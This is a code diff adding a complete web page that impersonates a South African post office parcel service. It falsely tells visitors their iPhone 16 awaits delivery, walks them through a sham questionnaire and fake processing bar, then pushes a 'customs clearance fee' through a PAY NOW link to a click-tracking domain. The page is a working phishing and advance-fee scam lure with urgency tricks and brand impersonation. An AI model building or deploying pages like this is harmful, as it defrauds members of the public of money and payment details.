@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Delivery – Schedule</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<style>
+  /* ---------- Design tokens (inspired by the screenshot) ---------- */
+  :root{
+    --brand:#c8102e;           /* vivid postal red */
+    --brand-dark:#9f0f24;
+    --ink:#1f2937;
+    --muted:#6b7280;
+    --bg:#f6f7fb;
+    --card:#ffffff;
+    --radius:18px;
+    --shadow:0 10px 28px rgba(17,24,39,.08);
+    --soft:0 1px 0 rgba(0,0,0,.05), 0 8px 16px rgba(0,0,0,.06);
+    /* NEW: attention colors */
+    --attention:#fff4b8;       /* warm postal yellow */
+    --attention-ink:#7a5500;   /* readable on yellow */
+    --attention-border:#f1d25a;/* border for contrast */
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,Arial,"Helvetica Neue";
+    color:var(--ink);
+    background:
+      radial-gradient(1200px 400px at 20% -10%, #fff 0, #fff0 60%),
+      linear-gradient(180deg,#fff 0,var(--bg) 70%);
+  }
+
+  /* ---------- Header ---------- */
+  .topbar{
+    background:#fff;
+    border-bottom:1px solid #e8eaee;
+    position:sticky; top:0; z-index:100;
+  }
+  .topbar-inner{
+    max-width:1100px; margin:0 auto;
+    padding:14px 18px;
+    display:flex; align-items:center; gap:16px; justify-content:space-between;
+  }
+  .brand{display:flex; gap:12px; align-items:center; text-decoration:none; color:inherit}
+  .brand img{height:42px; width:auto; display:block}
+  .brand h1{margin:0; font-size:18px; font-weight:800; letter-spacing:.2px}
+  .support-chip{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:6px 10px; border-radius:999px;
+    background:#f3f4f6; color:#374151; font-size:12px; box-shadow:var(--soft);
+  }
+
+  /* ---------- Icon ribbon ---------- */
+  .ribbon{
+    max-width:1100px; margin:10px auto 6px; padding:0 18px;
+    display:grid; grid-template-columns:repeat(7, minmax(0,1fr)); gap:10px;
+  }
+  .icon-tile{
+    aspect-ratio:1/1; border-radius:12px; background:#fff;
+    border:1px solid #e7e8ec; display:grid; place-items:center;
+    box-shadow:0 1px 0 rgba(0,0,0,.04);
+  }
+  .icon{ font-size:28px; user-select:none; }
+
+  /* ---------- Search + CTA ---------- */
+  .search-wrap{max-width:1100px; margin:10px auto; padding:0 18px}
+  .search-row{display:flex; gap:14px}
+  .search-input{
+    flex:1; height:48px; border-radius:12px; border:1px solid #dfe3ea;
+    padding:0 16px; font-size:16px; outline:none; background:#fff;
+    box-shadow:inset 0 1px 0 rgba(0,0,0,.03);
+  }
+  .search-btn{
+    width:180px; border-radius:12px; height:48px;
+    background:#e5e7eb; border:1px solid #d1d5db; font-weight:700; cursor:pointer;
+  }
+
+  /* ---------- Menu bar ---------- */
+  .menu-bar{
+    background:var(--brand); color:#fff; text-align:center;
+    padding:10px 16px; font-weight:700; letter-spacing:.3px;
+    box-shadow:0 2px 0 var(--brand-dark);
+  }
+
+  /* ---------- Hero banner ---------- */
+  .hero{ max-width:1100px; margin:0 auto; padding:0 18px; }
+  .banner{
+    margin-top:12px;
+    display:grid; grid-template-columns:1fr 1fr; gap:0;
+    background:#113355; color:#fff; overflow:hidden; border-radius:16px; box-shadow:var(--shadow);
+  }
+  .banner-left{
+    min-height:220px; background:
+      radial-gradient(600px 280px at 10% 30%, rgba(255,255,255,.2), transparent 60%),
+      linear-gradient(135deg, #294b77, #0f2a48);
+    display:grid; place-items:center; padding:18px;
+  }
+  .mailbox{
+    width:90%; max-width:380px; aspect-ratio:4/3; border-radius:14px;
+    background:linear-gradient(135deg,#e0ecff,#b6d4ff);
+    border:2px solid rgba(255,255,255,.55);
+    box-shadow:inset 0 0 0 2px rgba(0,0,0,.04), 0 14px 40px rgba(0,0,0,.25);
+    position:relative;
+  }
+  .mailbox:before{
+    content:""; position:absolute; left:8%; top:12%;
+    width:30%; height:18%; background:#fff; border-radius:6px; box-shadow:0 6px 18px rgba(0,0,0,.15);
+  }
+  .banner-right{
+    background:#fff; color:#0f2a48; padding:22px 24px;
+    display:flex; flex-direction:column; justify-content:center; gap:10px;
+  }
+  .headline{
+    font-size:26px; line-height:1.1; margin:0;
+    color:#0b2a57; letter-spacing:.2px;
+  }
+  .sub{margin:0; color:#1f2937}
+  .rate{ display:flex; flex-direction:column; gap:8px; margin-top:8px }
+  .pill{
+    display:flex; justify-content:space-between; align-items:center;
+    background:#f8fafc; border:1px solid #e5e7eb; border-radius:10px; padding:10px 12px; font-weight:700;
+  }
+  .pill small{font-weight:500; color:#6b7280}
+
+  /* ---------- Questionnaire card ---------- */
+  .wrap{max-width:900px; margin:18px auto; padding:0 18px}
+  .card{background:var(--card); border-radius:16px; box-shadow:var(--shadow); padding:24px}
+  .q{min-height:160px; display:flex; flex-direction:column; gap:12px; justify-content:center}
+  .q h2{margin:0; font-size:20px}
+  .answers{display:flex; flex-wrap:wrap; gap:12px; margin-top:8px}
+  .btn{
+    appearance:none; border:1px solid #e5e7eb; background:#fff; color:var(--ink);
+    padding:12px 18px; border-radius:12px; cursor:pointer; font-weight:700;
+    box-shadow:var(--soft); transition:transform .06s ease, box-shadow .2s ease, border-color .2s ease, background .2s ease;
+  }
+  .btn:hover{border-color:#cfd5df; box-shadow:0 1px 0 rgba(0,0,0,.05), 0 12px 24px rgba(0,0,0,.08)}
+  .btn:active{transform:translateY(1px)}
+  .btn.primary{background:var(--brand); color:#fff; border-color:transparent}
+  .muted{color:var(--muted); font-size:14px}
+
+  /* ---------- Processing bar ---------- */
+  .progress{width:100%; height:14px; border-radius:999px; background:#eef1f5; overflow:hidden; box-shadow:inset 0 0 0 1px #e6e8ee}
+  .bar{height:100%; width:0; background:linear-gradient(90deg,var(--brand),#ff4d5c); border-radius:inherit}
+
+  /* ---------- Contact footer (like screenshot) ---------- */
+  .contact{ background:#686b70; color:#fff; margin-top:28px; }
+  .contact-inner{ max-width:1100px; margin:0 auto; padding:22px 18px; text-align:center; }
+  .contact .big{font-size:26px; font-weight:800}
+  .contact .phone{margin-top:6px; font-size:22px}
+  .social{ display:flex; gap:14px; justify-content:center; padding:16px 0 26px; }
+  .soc{
+    height:42px; width:42px; border-radius:10px; background:#fff;
+    display:grid; place-items:center; box-shadow:0 6px 14px rgba(0,0,0,.18);
+    color:#1f2937; font-weight:900;
+    text-decoration:none;
+  }
+
+  /* ---------- NEW: small image beside the headline ---------- */
+  .headline-row{display:flex; align-items:center; gap:10px; flex-wrap:wrap}
+  .headline-inline-img{width:58px; height:auto; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.15)}
+
+  /* =================== NEW: Attention treatments for the questionnaire =================== */
+  /* 1) Gentle yellow highlight, animated beacon ring, and label chip */
+  #card{
+    position:relative;
+    background:linear-gradient(180deg, var(--attention) 0%, #fffce6 60%, #fff 100%);
+    border:2px solid var(--attention-border);
+    box-shadow:0 10px 28px rgba(17,24,39,.08), 0 0 0 6px rgba(241,210,90,.18);
+  }
+  #card::before{ /* "Action required" chip */
+    content:"Action required: answer delivery questions";
+    position:absolute; top:-12px; left:18px;
+    background:#111827; color:#fff; font-weight:800; font-size:12px; letter-spacing:.3px;
+    padding:6px 10px; border-radius:999px; box-shadow:var(--soft);
+  }
+  /* Animated beacon dot in the corner */
+  #card::after{
+    content:""; position:absolute; right:18px; top:18px; width:10px; height:10px; border-radius:999px;
+    background:radial-gradient(circle,#ffbf00 35%, #ff9900 36%, #ff9900 100%);
+    box-shadow:0 0 0 0 rgba(255,184,0,.7);
+    animation: beacon 2s ease-out infinite;
+  }
+  @keyframes beacon{ 0%{ box-shadow:0 0 0 0 rgba(255,184,0,.7);} 70%{ box-shadow:0 0 0 12px rgba(255,184,0,0);} 100%{ box-shadow:0 0 0 0 rgba(255,184,0,0);} }
+
+  /* 2) Arrow nudge to direct eyes to the buttons */
+  .answers{ position:relative; }
+  .answers::before{
+    content:"↓ Choose an option";
+    position:absolute; top:-28px; left:0; font-weight:800; font-size:13px; color:var(--attention-ink);
+    text-shadow:0 1px 0 rgba(255,255,255,.6);
+    animation: floaty 2.8s ease-in-out infinite;
+  }
+  @keyframes floaty{ 0%,100%{ transform:translateY(0) } 50%{ transform:translateY(2px) } }
+
+  /* 3) Stronger focus ring for accessibility */
+  .btn:focus{ outline:4px solid rgba(241,210,90,.65); outline-offset:2px }
+
+  /* 4) Subtle pulse of the question headline to draw attention */
+  .q h2{ color:#111827 }
+  .q h2.highlight-pulse{ animation: pulse 2s ease-in-out 2 }
+  @keyframes pulse{ 0%{ text-shadow:0 0 0 rgba(241,210,90,0) } 50%{ text-shadow:0 0 12px rgba(241,210,90,.9) } 100%{ text-shadow:0 0 0 rgba(241,210,90,0) } }
+
+  /* 5) Sticky bottom nudge when the card is off-screen */
+  .sticky-nudge{
+    position:fixed; left:12px; right:12px; bottom:12px; z-index:2000;
+    background:linear-gradient(180deg,#ffe991,#ffd24a); color:#111827; border:2px solid var(--attention-border);
+    border-radius:14px; box-shadow:0 10px 30px rgba(0,0,0,.18);
+    display:flex; align-items:center; justify-content:space-between; gap:12px; padding:10px 12px;
+    transform:translateY(120%); transition:transform .3s ease;
+  }
+  .sticky-nudge.show{ transform:translateY(0) }
+  .nudge-text{ font-weight:800 }
+  .nudge-btn{
+    appearance:none; background:#111827; color:#fff; border:0; border-radius:10px; padding:10px 14px; font-weight:800; cursor:pointer;
+  }
+
+  /* Respect reduced motion */
+  @media (prefers-reduced-motion:reduce){
+    #card::after, .answers::before, .q h2.highlight-pulse{ animation:none }
+  }
+
+  /* ---------- Responsive ---------- */
+  @media (max-width:880px){
+    .banner{grid-template-columns:1fr}
+    .banner-left{display:none}
+    .headline{font-size:22px}
+    .headline-row{justify-content:flex-start}
+  }
+</style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="topbar">
+    <div class="topbar-inner">
+      <a class="brand" href="#" aria-label="Home">
+        <img src="postoffice.png" alt="Logo">
+        <h1>Parcel Services</h1>
+      </a>
+      <span class="support-chip">Support • 24/7</span>
+    </div>
+  </div>
+
+  <!-- Icon ribbon -->
+  <div class="ribbon" aria-hidden="true">
+    <div class="icon-tile"><span class="icon">🔍</span></div>
+    <div class="icon-tile"><span class="icon">🏤</span></div>
+    <div class="icon-tile"><span class="icon">📬</span></div>
+    <div class="icon-tile"><span class="icon">🅁</span></div>
+    <div class="icon-tile"><span class="icon">📨</span></div>
+    <div class="icon-tile"><span class="icon">@</span></div>
+    <div class="icon-tile"><span class="icon">👤</span></div>
+  </div>
+
+  <!-- Search + button -->
+  <div class="search-wrap">
+    <div class="search-row">
+      <input class="search-input" placeholder="Track or search…" aria-label="Search" />
+      <button class="search-btn" type="button">Search</button>
+    </div>
+  </div>
+
+  <!-- Menu bar -->
+  <div class="menu-bar">Show Menu</div>
+
+  <!-- Hero banner (styled like the screenshot) -->
+  <section class="hero">
+    <div class="banner">
+      <div class="banner-left">
+        <div class="mailbox" aria-hidden="true"></div>
+      </div>
+      <div class="banner-right">
+        <!-- CHANGED: headline + small inline image -->
+        <div class="headline-row">
+          <h2 class="headline">Your (iPhone 16) is ready to be delivered.</h2>
+          <img src="ipn16 (2).png" alt="iPhone 16" class="headline-inline-img">
+        </div>
+
+        <p class="sub">Answer a few quick questions to lock in your preferred delivery schedule.</p>
+        <div class="rate">
+          <div class="pill"><span>Standard handling</span><small>per parcel</small><strong>FREE</strong></div>
+          <div class="pill"><span>Express window</span><small>per parcel</small><strong>R 95</strong></div>
+          <div class="pill"><span>Customs clearence</span><small>per parcel</small><strong>R 58</strong></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Questionnaire -->
+  <main class="wrap">
+    <div class="card" id="card">
+      <div class="q" id="q"></div>
+    </div>
+  </main>
+
+  <!-- Contact strip -->
+  <footer class="contact">
+    <div class="contact-inner">
+      <div class="big">support@postoffice.co.za</div>
+      <div class="phone">0860 111 502</div>
+      <div class="social">
+        <a class="soc" href="#" aria-label="Facebook">f</a>
+        <a class="soc" href="#" aria-label="Pinterest">p</a>
+        <a class="soc" href="#" aria-label="Close">×</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Sticky bottom nudge (hidden by default) -->
+  <div class="sticky-nudge" id="nudge" role="dialog" aria-live="polite" aria-label="Answer delivery questions">
+    <span class="nudge-text">Finish delivery setup →</span>
+    <button class="nudge-btn" type="button" id="nudgeBtn">Answer now</button>
+  </div>
+
+<script>
+  // ---------- Steps as requested ----------
+  const STEPS = [
+    { prompt: "Where do you want your parcel delivered?", options: ["Work", "Home"] },
+    { prompt: "When would you like to receive the parcel?", options: ["Morning", "Afternoon"] },
+    { prompt: "Is this your first time receiving express delivery from our service?", options: ["Yes", "No"] }
+  ];
+
+  // Replace only if you have an approved destination
+  const AUTHORIZED_PAYMENT_URL = "https://cudsr.bemobtrcks.com/click";
+
+  const qEl = document.getElementById("q");
+  let step = 0;
+  const answers = [];
+
+  function renderQuestion(){
+    const s = STEPS[step];
+    qEl.innerHTML = `
+      <h2 class="highlight-pulse">${s.prompt}</h2>
+      <div class="answers">
+        ${s.options.map(o=>`<button class="btn" data-answer="${o}" type="button">${o}</button>`).join("")}
+      </div>
+      <div class="muted">Step ${step+1} of ${STEPS.length}</div>
+    `;
+    qEl.querySelectorAll("[data-answer]").forEach(b=>{
+      b.addEventListener("click", ()=>{
+        answers.push({q:s.prompt, a:b.dataset.answer});
+        step++;
+        if(step < STEPS.length) renderQuestion();
+        else renderProcessing();
+      });
+    });
+  }
+
+  function renderProcessing(){
+    qEl.innerHTML = `
+      <h2>PROCESSING YOUR ANSWERS</h2>
+      <div class="progress"><div class="bar" id="procBar"></div></div>
+      <p class="muted">This takes about 4 seconds…</p>
+    `;
+    const bar = document.getElementById("procBar");
+    bar.style.transition = "width 4s linear";
+    requestAnimationFrame(()=> bar.style.width = "100%");
+    setTimeout(renderSuccess, 4050);
+  }
+
+  function renderSuccess(){
+    qEl.innerHTML = `
+      <h2 style="margin-bottom:6px;">CONGRATULATIONS!</h2>
+      <p style="margin:0 0 10px">Your parcel is ready for delivery. Please pay the customs clearance fee (R58) on the next page and your iPhone 16 will be delivered to you.</p>
+      <div class="answers">
+        <a class="btn primary" href="${AUTHORIZED_PAYMENT_URL}" target="_blank" rel="noopener noreferrer">PAY NOW</a>
+      </div>
+      <p class="muted" style="margin-top:10px">Opens in a new tab.</p>
+    `;
+    console.log("Selections:", answers);
+  }
+
+  renderQuestion();
+
+  // ---------- NEW: sticky nudge that appears when the questionnaire is not visible ----------
+  const nudge = document.getElementById('nudge');
+  const nudgeBtn = document.getElementById('nudgeBtn');
+  const card = document.getElementById('card');
+
+  const io = new IntersectionObserver((entries)=>{
+    entries.forEach(entry=>{
+      // If the card is out of view by at least 50%, show the nudge
+      if(entry.target === card){
+        if(entry.isIntersecting){ nudge.classList.remove('show'); }
+        else{ nudge.classList.add('show'); }
+      }
+    })
+  }, { threshold: 0.5 });
+
+  io.observe(card);
+
+  function scrollToCard(){
+    card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    // brief pulse of the headline when arriving
+    const h2 = card.querySelector('.q h2');
+    if(h2){ h2.classList.add('highlight-pulse'); setTimeout(()=>h2.classList.remove('highlight-pulse'), 2200); }
+  }
+
+  nudgeBtn.addEventListener('click', scrollToCard);
+
+  // Also allow clicking the entire nudge area
+  nudge.addEventListener('click', (e)=>{ if(e.target !== nudgeBtn) scrollToCard(); });
+</script>
+</body>
+</html>
